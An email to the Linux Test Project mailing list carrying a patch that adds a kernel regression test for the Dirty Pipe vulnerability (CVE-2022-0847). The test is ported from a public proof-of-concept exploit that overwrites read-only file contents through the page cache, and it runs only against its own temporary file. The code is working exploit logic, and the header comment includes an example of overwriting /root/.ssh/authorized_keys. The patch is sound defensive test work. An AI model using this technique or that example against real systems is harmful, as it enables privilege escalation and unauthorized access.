Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 0E505C433EF
	for <ltp@archiver.kernel.org>; Tue, 12 Jul 2022 03:03:16 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 256993C9F94
	for <ltp@archiver.kernel.org>; Tue, 12 Jul 2022 05:03:14 +0200 (CEST)
Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::3])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (P-384) server-digest SHA384)
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 1988B3CA607
 for <ltp@lists.linux.it>; Tue, 12 Jul 2022 05:03:01 +0200 (CEST)
Received: from mail1.bemta37.messagelabs.com (mail1.bemta37.messagelabs.com
 [85.158.142.113])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by in-3.smtp.seeweb.it (Postfix) with ESMTPS id EAEBF1A00920
 for <ltp@lists.linux.it>; Tue, 12 Jul 2022 05:02:59 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=fujitsu.com;
 s=170520fj; t=1657594978; i=@fujitsu.com;
 bh=i+dgb8kgN9Ek/gfjz9Z2PUlN8aL2d/r2mtwaZR9qOQ8=;
 h=From:To:CC:Subject:Date:Message-ID:In-Reply-To:References:
 MIME-Version:Content-Type;
 b=NyEvIGyuD/aXgLy8JddKANGvr2pNr3xpB76l1Fzrik8KhG0op2IUogZMvoquZDPko
 Gx/V2gV5xhnYOiQmG61y+svrXdsaGuJCVf+/fhUM4yvHwlW9zW2MH9kVA49KtgMfUU
 QEstktssQb8VIhJYuQVZW887FahWUnnLQI4w/ypTAV4uedAfk5qN81b5LtPcJAWhgK
 flehVdbwVV5yiWm5kwVoSf1iP7ztz2UXe6S+epT2ONpK/kIuAdNOJIWWtO9smi45lS
 SxTVKx6OVKHMFpQ+luoEu0o8VSF+6PodP9k65MCw9E9x6UpfjSyjCc5FZtIcZo3QAx
 5hBTxfv2F8jYg==
X-Brightmail-Tracker: H4sIAAAAAAAAA+NgFrrBIsWRWlGSWpSXmKPExsViZ8OxWTfpyZk
 kg1VruS1WfN/B6MDose/3OtYAxijWzLyk/IoE1ozpaycxFlw0rriz6xN7A+M07S5GTg4hgZOM
 EsdX23QxcgHZe5gkLv9bxgLlMEoc3buPFaSKTUBT4lnnAmYQW0RAQqKj4S07iM0soC6xfNIvJ
 hBbWMBJYv7/yWwgNouAqsTb6afB4rwCHhKLpm8B65UQUJCY8vA9mM0JVDPp9DI2iCtUJKadOM
 4MUS8ocXLmExaI+RISB1+8gOpVlLjU8Y0Rwq6QeH34ElRcTeLquU3MExgFZyFpn4WkfQEj0yp
 Gm6SizPSMktzEzBxdQwMDXUNDU11Lc11DY0u9xCrdRL3UUt28/KKSDF1DvcTyYr3U4mK94src
 5JwUvbzUkk2MwEBOKU7s3sG4et8vvUOMkhxMSqK8v/acSRLiS8pPqcxILM6ILyrNSS0+xCjDw
 aEkwSvyCCgnWJSanlqRlpkDjCqYtAQHj5II74E7QGne4oLE3OLMdIjUKUZdjoX9V/cyC7Hk5e
 elSonzuj0GKhIAKcoozYMbAYvwS4yyUsK8jAwMDEI8BalFuZklqPKvGMU5GJWEedVBLuHJzCu
 B2/QK6AgmoCPkIsGOKElESEk1MDm4RpseqP6VFeS06F+ws43nxKm/Vdslj5TZrFJ5cjLzqGrN
 1m9Fb8WlWFdMm5R4YyLn/pPVBjz+n6ctO/yzpGPpFa2O9pXyIZc+LgxNXO/xgmdC3YEd1Td39
 MU6b7fdGt5QF/8u2yKlJ2mSKNN6H4kFl0PZVJ8yvxe/8ePNVlslS19jx2veufuM41TT1i56pS
 nxa4dVWftXtTmvZhlceZZ8gNXLuytZ+tuDr06rUhN0I5s/Tr7uqfj9gVrcp8DE0qYJ6s1f2x+
 6WQV/Ofef/9v3aKPQq39+r4lb3bD2X2uFUt4C81ncNydoc4tf1fBQfbXotrKKi+f6P46/Y3T3
 LIhkV4zcmuBbb6K39+CfaiWW4oxEQy3mouJEADwWs5VrAwAA
X-Env-Sender: xuyang2018.jy@fujitsu.com
X-Msg-Ref: server-15.tower-728.messagelabs.com!1657594977!50599!1
X-Originating-IP: [62.60.8.179]
X-SYMC-ESS-Client-Auth: outbound-route-from=pass
X-StarScan-Received: 
X-StarScan-Version: 9.87.3; banners=-,-,-
X-VirusChecked: Checked
Received: (qmail 2352 invoked from network); 12 Jul 2022 03:02:58 -0000
Received: from unknown (HELO n03ukasimr04.n03.fujitsu.local) (62.60.8.179)
 by server-15.tower-728.messagelabs.com with ECDHE-RSA-AES256-GCM-SHA384
 encrypted SMTP; 12 Jul 2022 03:02:58 -0000
Received: from n03ukasimr04.n03.fujitsu.local (localhost [127.0.0.1])
 by n03ukasimr04.n03.fujitsu.local (Postfix) with ESMTP id 8DA7B7B
 for <ltp@lists.linux.it>; Tue, 12 Jul 2022 04:02:57 +0100 (BST)
Received: from R01UKEXCASM126.r01.fujitsu.local (R01UKEXCASM126
 [10.183.43.178])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-SHA384 (256/256 bits))
 (No client certificate requested)
 by n03ukasimr04.n03.fujitsu.local (Postfix) with ESMTPS id 8001A75
 for <ltp@lists.linux.it>; Tue, 12 Jul 2022 04:02:57 +0100 (BST)
Received: from localhost.localdomain (10.167.220.84) by
 R01UKEXCASM126.r01.fujitsu.local (10.183.43.178) with Microsoft SMTP Server
 (TLS) id 15.0.1497.32; Tue, 12 Jul 2022 04:02:56 +0100
From: Yang Xu <xuyang2018.jy@fujitsu.com>
To: <ltp@lists.linux.it>
Date: Tue, 12 Jul 2022 12:03:16 +0800
Message-ID: <1657598596-2296-1-git-send-email-xuyang2018.jy@fujitsu.com>
X-Mailer: git-send-email 1.8.3.1
In-Reply-To: <87k08joqp7.fsf@suse.de>
References: <87k08joqp7.fsf@suse.de>
MIME-Version: 1.0
X-Originating-IP: [10.167.220.84]
X-ClientProxiedBy: G08CNEXCHPEKD08.g08.fujitsu.local (10.167.33.83) To
 R01UKEXCASM126.r01.fujitsu.local (10.183.43.178)
X-Virus-Scanned: clamav-milter 0.102.4 at in-3.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH v2] security/dirtypipe: Add test for CVE-2022-0847
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Fixes: #921
Signed-off-by: Yang Xu <xuyang2018.jy@fujitsu.com>
---
 runtest/cve                                   |   1 +
 runtest/syscalls                              |   1 +
 .../kernel/security/dirtypipe/.gitignore      |   1 +
 testcases/kernel/security/dirtypipe/Makefile  |   6 +
 .../kernel/security/dirtypipe/dirtypipe.c     | 175 ++++++++++++++++++
 5 files changed, 184 insertions(+)
 create mode 100644 testcases/kernel/security/dirtypipe/.gitignore
 create mode 100644 testcases/kernel/security/dirtypipe/Makefile
 create mode 100644 testcases/kernel/security/dirtypipe/dirtypipe.c

diff --git a/runtest/cve b/runtest/cve
index eaaaa19d7..9ab6dc282 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -72,5 +72,6 @@ cve-2021-4034 execve06
 cve-2021-22555 setsockopt08 -i 100
 cve-2021-26708 vsock01
 cve-2021-22600 setsockopt09
+cve-2022-0847 dirtypipe
 # Tests below may cause kernel memory leak
 cve-2020-25704 perf_event_open03
diff --git a/runtest/syscalls b/runtest/syscalls
index 36fc50aeb..3aead3c86 100644
--- a/runtest/syscalls
+++ b/runtest/syscalls
@@ -1034,6 +1034,7 @@ process_vm_writev02 process_vm_writev02
 
 prot_hsymlinks prot_hsymlinks
 dirtyc0w dirtyc0w
+dirtypipe dirtypipe
 
 pselect01 pselect01
 pselect01_64 pselect01_64
diff --git a/testcases/kernel/security/dirtypipe/.gitignore b/testcases/kernel/security/dirtypipe/.gitignore
new file mode 100644
index 000000000..fdf39eed2
--- /dev/null
+++ b/testcases/kernel/security/dirtypipe/.gitignore
@@ -0,0 +1 @@
+/dirtypipe
diff --git a/testcases/kernel/security/dirtypipe/Makefile b/testcases/kernel/security/dirtypipe/Makefile
new file mode 100644
index 000000000..5ea7d67db
--- /dev/null
+++ b/testcases/kernel/security/dirtypipe/Makefile
@@ -0,0 +1,6 @@
+# SPDX-License-Identifier: GPL-2.0-or-later
+
+top_srcdir		?= ../../../..
+
+include $(top_srcdir)/include/mk/testcases.mk
+include $(top_srcdir)/include/mk/generic_leaf_target.mk
diff --git a/testcases/kernel/security/dirtypipe/dirtypipe.c b/testcases/kernel/security/dirtypipe/dirtypipe.c
new file mode 100644
index 000000000..ae6764351
--- /dev/null
+++ b/testcases/kernel/security/dirtypipe/dirtypipe.c
@@ -0,0 +1,175 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * Author: Max Kellermann <max.kellermann@ionos.com>
+ *
+ * Ported into LTP by Yang Xu <xuyang2018.jy@fujitsu.com>
+ */
+
+/*\
+ * [Description]
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd ("pipe: merge
+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include "tst_test.h"
+
+#define TEXT "AAAAAAAABBBBBBBB"
+#define TESTFILE "testfile"
+#define CHUNK 64
+#define BUFSIZE 4096
+
+static int p[2] = {-1, -1}, fd = -1;
+static char *pattern_buf, *read_buf;
+
+static void check_file_contents(void)
+{
+	SAFE_LSEEK(fd, 0, SEEK_SET);
+	SAFE_READ(1, fd, read_buf, 4096);
+
+	if (memcmp(pattern_buf, read_buf, 4096) != 0)
+		tst_res(TFAIL, "read buf data mismatch, bug exists");
+	else
+		tst_res(TPASS, "read buff data match, bug doesn't exist");
+}
+
+/*
+ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(void)
+{
+	unsigned int pipe_size, total, n, len;
+	char buffer[BUFSIZE];
+
+	SAFE_PIPE(p);
+	pipe_size = SAFE_FCNTL(p[1], F_GETPIPE_SZ);
+
+	/*
+	 * fill the pipe completely; each pipe_buffer will now have the
+	 * PIPE_BUF_FLAG_CAN_MERGE flag
+	 */
+	for (total = pipe_size; total > 0;) {
+		n = total > sizeof(buffer) ? sizeof(buffer) : total;
+		len = SAFE_WRITE(1, p[1], buffer, n);
+		total -= len;
+	}
+
+	/*
+	 * drain the pipe, freeing all pipe_buffer instances (but leaving the
+	 * flags initialized)
+	 */
+	for (total = pipe_size; total > 0;) {
+		n = total > sizeof(buffer) ? sizeof(buffer) : total;
+		len = SAFE_READ(1, p[0], buffer, n);
+		total -= len;
+	}
+
+	/*
+	 * the pipe is now empty, and if somebody adds a new pipe_buffer
+	 * without initializing its "flags", the buffer wiill be mergeable
+	 */
+}
+
+static void run(void)
+{
+	off_t offset;
+	int data_size, len;
+	ssize_t nbytes;
+
+	offset = 1;
+	data_size = strlen(TEXT);
+
+	fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+
+	prepare_pipe();
+
+	offset = 0;
+	/*
+	 * splice one byte from the start into the pipe;
+	 * this will add a reference to the page cache, but since
+	 * copy_page_to_iter_pipe() does not initialize the "flags",
+	 * PIPE_BUF_FLAG_CAN_MERGE is still set
+	 */
+	nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+	if (nbytes < 0)
+		tst_brk(TFAIL, "splice failed");
+	if (nbytes == 0)
+		tst_brk(TFAIL, "short splice");
+
+	/*
+	 * the following write will not create a new pipe_buffer, but
+	 * will instead write into the page cache, because of the
+	 * PIPE_BUF_FLAG_CAN_MERGE flag
+	 */
+	len = SAFE_WRITE(1, p[1], TEXT, data_size);
+	if (len < nbytes)
+		tst_brk(TFAIL, "short write");
+
+	check_file_contents();
+	SAFE_CLOSE(p[0]);
+	SAFE_CLOSE(p[1]);
+	SAFE_CLOSE(fd);
+}
+
+static void setup(void)
+{
+	memset(pattern_buf, 0xff, BUFSIZE);
+	tst_fill_file(TESTFILE, 0xff, CHUNK, BUFSIZE / CHUNK);
+}
+
+static void cleanup(void)
+{
+	if (p[0] > -1)
+		SAFE_CLOSE(p[0]);
+	if (p[1] > -1)
+		SAFE_CLOSE(p[1]);
+	if (fd > -1)
+		SAFE_CLOSE(fd);
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.cleanup = cleanup,
+	.test_all = run,
+	.needs_tmpdir = 1,
+	.bufs = (struct tst_buffers []) {
+		{&pattern_buf, .size = 4096},
+		{&read_buf, .size = 4096},
+		{},
+	},
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "9d2231c5d74e"},
+		{"CVE", "CVE-2022-0847"},
+		{},
+	}
+};
-- 
2.27.0


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
